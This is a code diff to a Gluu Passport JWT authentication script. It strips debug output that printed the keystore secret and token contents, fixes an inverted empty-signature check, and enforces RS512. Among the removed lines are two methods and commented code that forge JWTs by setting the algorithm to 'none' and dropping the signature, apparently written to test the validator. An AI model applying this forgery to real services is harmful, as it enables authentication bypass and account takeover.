@@ -100,52 +100,26 @@ class PersonAuthentication(PersonAuthenticationType):
 
 
             if jwt_param == None:
-                print "entered if jwt_param == None"
-
                 # gets jwt parameter "user" sent after authentication by passport (if exists)
                 jwt_param = ServerUtil.getFirstValue(requestParameters, "user")
-
-                '''
-                # INTERCEPT jwt_param
-                if jwt_param != None:
-                    print "INTERCEPTING JWT"
-                    print "Entered nested jwt_param != None"
-                    #jwt_cracked = self.getCrackedJwtParam(jwt_param)
-
-                    #jwt_param = jwt_cracked
-                    print "jwt_param (cracked) = %s" % str(jwt_param)
-                '''
 
 
             if jwt_param != None:
                 # and now that the jwt_param user exists...
                 
-                print "entered jwt_param != None"
                 print "Passport. authenticate for step 1. JWT user profile token found"
-
-                print "jwt_param = %s" % str(jwt_param)
-                print "jwt_param type is %s" % type(jwt_param)
-
 
                 # Parse JWT and validate
                 jwt = Jwt.parse(jwt_param)
-                print "jwt = %s" % str(jwt)
-                print "jwt type is %s" % type(jwt)
-
+                
                 if not self.validSignature(jwt):
-                    print "if not self.validSignature(jwt)"
                     return False
 
                 if self.jwtHasExpired(jwt):
                     return False
 
-
-                # Gets user profile as string? and json using the information on JWT
+                # Gets user profile as string and json using the information on JWT
                 (user_profile, jsonp) = self.getUserProfile(jwt)
-
-                print "user_profile + jsonp data values:"
-                print user_profile
-                print jsonp
 
                 if user_profile == None:
                     print "if user_profile == None"
@@ -172,12 +146,14 @@ class PersonAuthentication(PersonAuthenticationType):
                 print "Passport. authenticate for step 1. Basic authentication returned: %s" % logged_in
                 return logged_in
 
-            # first time comes here
+
             elif provider in self.registeredProviders:
                 # user selected provider
                 # it's a recognized external IDP
+
                 identity.setWorkingParameter("selectedProvider", provider)
                 print "Passport. authenticate for step 1. Retrying step 1"
+
                 #see prepareForStep (step = 1)
                 return True
 
@@ -239,7 +215,7 @@ class PersonAuthentication(PersonAuthenticationType):
                 # get it from sessionAtributes
                 paramValue = sessionAttributes.get(providerParam)
 
-                #if they exists
+                #if exists
                 if paramValue != None:
                     print "Passport. prepareForStep. Found value in custom param of authorization request: %s" % paramValue
                     provider = self.getProviderFromJson(paramValue)
@@ -252,7 +228,7 @@ class PersonAuthentication(PersonAuthenticationType):
                         url = self.getPassportRedirectUrl(provider)
 
 
-            # this is the case in the beggining
+            # if no provider selected yet...
             if url == None:
                 print "Passport. prepareForStep. A page to manually select an identity provider will be shown"
             
@@ -263,30 +239,7 @@ class PersonAuthentication(PersonAuthenticationType):
 
                 # redirects to Passport getRedirectURL (JWT Token URL?) - what sends browser to IDP. Does IDP receives token? Os passport? What it does with token?
                 
-                print "Passport - Redirecting to external url: %s" + url
-                # Passport POST saml AuthnRequest assertion to SAML2/POST/SSO (ext idp) 
-                # GET ?execution=e1s1 - includes JSESSIONID cookie that redirects to
-                # GET ?conversation=e1s1 - that redirects to
-                # GET <ext-idp>/oxauth/restv1/authorize? and params are:
-                # response_type: code
-                # client_id: 1101.d7c852e7-9e05-4e1b-b723-f273850e9af9
-                # scope: openid email+user_name
-                # redirect_uri: https://chris.idp.org/idp/Authn/oxAuth - CALLBACK IS ON IDP HOST
-                # state: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0ZSI6IlNua2RQSW9KdGciLCJjb252ZXJzYXRpb24iOiJlMXMxIn0.
-                # nonce: 3afdE0iOjz
-                # acr_values: urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport NAMETYPE SENT AS ACR
-                # entityId: urn:gluulocal:org
-
-                # that redirects to
-                # GET <ext-idp>/oxauth/authorize.htm? with THE SAME PREVIOUS PARAMS except entityId that is not sent
-                # that redirects to IDP LOGIN PAGE & set cookies (session_id, session_state, rp_origin_id)
-
-                # and we go now to authenticate() for step 1 after login is submited on IDP if jwt_param == None
-
-
-
-
-                
+                print "Passport. Redirecting to external url: %s" + url
                 
                 facesService.redirectToExternalURL(url)
 
@@ -519,9 +472,9 @@ class PersonAuthentication(PersonAuthenticationType):
             print "Passport. getPassportRedirectUrl. Response was %s" % httpResponse.getStatusLine().getStatusCode()
 
             tokenObj = json.loads(response)
-            print "json response is: %s" % str(tokenObj)
 
             url = "/passport/auth/%s/%s" % (provider, tokenObj["token_"])
+
         except:
             print "Passport. getPassportRedirectUrl. Error building redirect URL: ", sys.exc_info()[1]
 
@@ -537,80 +490,46 @@ class PersonAuthentication(PersonAuthenticationType):
 
         try:
             appConfiguration = AppConfiguration()
-
-            print "WebKeyStorage.KEYSTORE:"
-            print WebKeyStorage.KEYSTORE
-
             appConfiguration.setWebKeysStorage(WebKeyStorage.KEYSTORE)
-            print "getWebsStorage: "
-            #print appConfiguration.WebKeyStorage().getWebsStorage()
-
-
-
             appConfiguration.setKeyStoreFile(self.keyStoreFile)
-            print "getKeyStoreFile: "
-            print appConfiguration.getKeyStoreFile()
-
-
             appConfiguration.setKeyStoreSecret(self.keyStorePassword)
-            print appConfiguration.getKeyStoreSecret()
-            
-
             appConfiguration.setKeyRegenerationEnabled(False)
 
             cryptoProvider = CryptoProviderFactory.getCryptoProvider(appConfiguration)
-            print "cryptoProvider: "
-            print cryptoProvider
+            
 
-
-            print "jwt.getSigningInput(): %s" % jwt.getSigningInput()
-            print "jwt.getEncodedSignature(): %s" % jwt.getEncodedSignature()
-            print "jwt.getHeader().getKeyId(): %s" % jwt.getHeader().getKeyId()
-            print "jwt.getHeader().getAlgorithm(): %s" % jwt.getHeader().getAlgorithm()
-
-            print type(jwt.getHeader().getAlgorithm())
             alg_string = str(jwt.getHeader().getAlgorithm())
             signature_string = str(jwt.getEncodedSignature())
-            print "alg_string = %s" % alg_string
 
             if alg_string == "none" or alg_string == "None" or alg_string == "NoNe" or alg_string == "nONE" or alg_string == "NONE" or alg_string == "NonE" or alg_string == "nOnE":
                 # blocks none attack
+
                 print "WARNING: JWT Signature algorithm is none"
                 valid = False
+            
             elif alg_string != "RS512":
                 # blocks anything that's not RS512
+            
                 print "WARNING: JWT Signature algorithm is NOT RS512"
-                # blocks 
                 valid = False
-            elif signature_string != "" :
+            
+            elif signature_string == "" :
+                # blocks empty signature string
                 print "WARNING: JWT Signature not sent"
                 valid = False
+            
             else:
-                #changed method from .getSignatureAlgorithm() to getAlgorithm() and worked
-                # some class that extends AbstractCryptoProvider
+                #changed method from .getSignatureAlgorithm() to getAlgorithm()
+                # class that extends AbstractCryptoProvider
                 
                 valid = cryptoProvider.verifySignature(jwt.getSigningInput(), jwt.getEncodedSignature(), jwt.getHeader().getKeyId(),
                                                             None, None, jwt.getHeader().getAlgorithm())
 
-            
-
-            '''
-            # Cracking with signature None
-
-            if valid == False:
-                # Try without signature
-                print "Entered valid == false"
-                valid = cryptoProvider.verifySignature(jwt.getSigningInput(), None, jwt.getHeader().getKeyId(),
-                                                        None, None, jwt.getHeader().getAlgorithm())
-                if valid == True:
-                    print "Token validated sending verifySignature as None"
-                print valid
-
-            '''
         except:
             print "Exception: ", sys.exc_info()[1]
 
         print "Passport. validSignature. Validation result was %s" % valid
+
         return valid
 
 
@@ -628,21 +547,14 @@ class PersonAuthentication(PersonAuthenticationType):
 
 
     def getUserProfile(self, jwt):
-        print "Entered getUserProfile"
-        print "getUserProfile jwt = %s" % str(jwt)
-        print type(jwt)
-
-
-        # get the claims method located at org.gluu.oxauth.model.token.JsonWebResponse.java as a org.gluu.oxauth.model.jwt.JwtClaims object
+        
+        # getClaims method located at org.gluu.oxauth.model.token.JsonWebResponse.java as a org.gluu.oxauth.model.jwt.JwtClaims object
         jwt_claims = jwt.getClaims()
-        jwt_claims_string_data = jwt_claims.getClaimAsString("data")
-        print "jwt_claims = %s" % jwt_claims
-        print "jwt_claims_string_data = %s" % jwt_claims_string_data
-
+        
         user_profile_json = None
 
         try:
-            #     public String getClaimAsString(String key) - key is "data"
+            # public String getClaimAsString(String key)
             user_profile_json = CdiUtil.bean(EncryptionService).decrypt(jwt_claims.getClaimAsString("data"))
 
             user_profile = json.loads(user_profile_json)
@@ -653,8 +565,6 @@ class PersonAuthentication(PersonAuthenticationType):
 
 
     def attemptAuthentication(self, identity, user_profile, user_profile_json):
-        print "Entered attemptAuthentication..."
-
         uidKey = "uid"
         if not self.checkRequiredAttributes(user_profile, [uidKey, self.providerKey]):
             return False
@@ -850,177 +760,3 @@ class PersonAuthentication(PersonAuthenticationType):
             return False
 
         return True
-
-# Trying to intercept vulnerability
-    def getCrackedJwtParam(self, jwt_param):
-        '''
-        method to create jwt_param cracked
-        '''
-        print "ENTERED getCrackedJwtParam()"
-        end_index = str(jwt_param).rfind(".")
-                
-
-        # slicing header
-        print str(jwt_param)[:end_index]
-        
-        first_point = str(jwt_param).find(".")
-        
-        header = str(jwt_param)[:first_point]
-        print header
-        header = header + "=="
-        
-        # slicing payload
-
-        #payload without the first point
-
-        payload = str(jwt_param)[(first_point+1):end_index]
-        payload += "=="
-        print payload
-
-        signature = str(jwt_param)[(end_index+1):]
-
-
-
-        header_bytes = base64.b64decode(header)
-        print header_bytes
-        header_decoded = header_bytes.decode('ascii')
-
-        payload_bytes = base64.b64decode(payload)
-        payload_decoded = payload_bytes.decode('ascii')
-
-
-
-
-
-        print "Header decoded: %s" % header_decoded
-        print "Payload decoded: %s" % payload_decoded
-
-        print "payload decoded type: %s" % type(payload_decoded)
-
-
-        json_payload = { 
-                        "iss":"https://chris.gluulocal.org/oxauth/postlogin.htm",
-                        "sub":"tester1","aud":"1502.adc5b6d4-09fe-4c03-9b2c-e55c1d3d7b92",
-                        "jti":"c82e9023-08ce-416a-a548-92c448be47a7",
-                        "exp":1589239964.193,
-                        "iat":1589239934193,
-                        "data":"eGgCfmRreuyonDVa1tjK1wnjosn0054mZjHtPHsh2nst9WBN1+LTuCeAYvmIkL/5Gjmo+L0HOA2Cbik44vltiNhfOMi+SE5tjYYC9UhahW84T/souVJ+CM7YfxWN8+f7BQiO5GT+mO463TtXxi8tPgRUB2229et1BQiO5GT+mO5VFqsbie+63R0QTvWih3lXHwzr6m4u9vskXkBasti6eg=="}
-
-        
-        #1. change alg to none and keep the rest
-
-        # changing headers (alg, kid...)
-        json_header_decoded = json.loads(header_decoded)
-
-        # changing alg
-        json_header_decoded['alg'] = 'none'
-
-        header_decoded = json.dumps(json_header_decoded)
-
-        header_bytes = base64.b64encode(header_decoded)
-
-
-        # joining strings
-        header_encoded = header_bytes.encode('ascii')
-
-        print "New header encoded: %s" % header_encoded
-
-        # changing jwt_string
-
-        # header with alg changed and full signature
-        # changed_jwt_string = header_encoded + str(jwt_param)[first_point:]
-
-        # header with alg changed and no signture
-        changed_jwt_string = header_encoded + "." + payload + "."
-
-        print "changed_jwt_string : %s" % changed_jwt_string
-
-
-        # create Jwt object - not used
-        # changed_jwt = Jwt.parse(changed_jwt_string)
-        # print changed_jwt
-
-        # return changed_jwt
-
-        return changed_jwt_string
-
-    def rawParseUserToken(self, jwt):
-
-        end_index = str(jwt).rfind(".")
-                
-
-        # slicing header
-        print str(jwt)[:end_index]
-        
-        first_point = str(jwt).find(".")
-        
-        header = str(jwt)[:first_point]
-        print header
-        header = header + "=="
-        
-        # slicing payload
-
-        #payload without the first point
-
-        payload = str(jwt)[(first_point+1):end_index]
-        payload += "=="
-        print payload
-
-
-
-        header_bytes = base64.b64decode(header)
-        print header_bytes
-        header_decoded = header_bytes.decode('ascii')
-
-        payload_bytes = base64.b64decode(payload)
-        payload_decoded = payload_bytes.decode('ascii')
-
-
-
-        print "Header decoded: %s" % header_decoded
-        print "Payload decoded: %s" % payload_decoded
-
-        print "payload decoded type: %s" % type(payload_decoded)
-
-
-        json_payload = { 
-                        "iss":"https://chris.gluulocal.org/oxauth/postlogin.htm",
-                        "sub":"tester1","aud":"1502.adc5b6d4-09fe-4c03-9b2c-e55c1d3d7b92",
-                        "jti":"c82e9023-08ce-416a-a548-92c448be47a7",
-                        "exp":1589239964.193,
-                        "iat":1589239934193,
-                        "data":"eGgCfmRreuyonDVa1tjK1wnjosn0054mZjHtPHsh2nst9WBN1+LTuCeAYvmIkL/5Gjmo+L0HOA2Cbik44vltiNhfOMi+SE5tjYYC9UhahW84T/souVJ+CM7YfxWN8+f7BQiO5GT+mO463TtXxi8tPgRUB2229et1BQiO5GT+mO5VFqsbie+63R0QTvWih3lXHwzr6m4u9vskXkBasti6eg=="}
-
-        
-        #1. change alg to none and keep the rest
-
-        # changing alg to none
-        json_header_decoded = json.loads(header_decoded)
-
-        json_header_decoded['alg'] = 'none'
-
-        header_decoded = json.dumps(json_header_decoded)
-
-        header_bytes = base64.b64encode(header_decoded)
-
-
-        # joining strings
-        header_encoded = header_bytes.encode('ascii')
-
-        print "New header encoded: %s" % header_encoded
-
-        changed_jwt_string = header_encoded + str(jwt)[first_point:]
-
-        print "changed_jwt_string : %s" % changed_jwt_string
-
-
-        # create Jwt object
-        changed_jwt = Jwt.parse(changed_jwt_string)
-        print changed_jwt
-
-        return changed_jwt
-
-
-
-
-
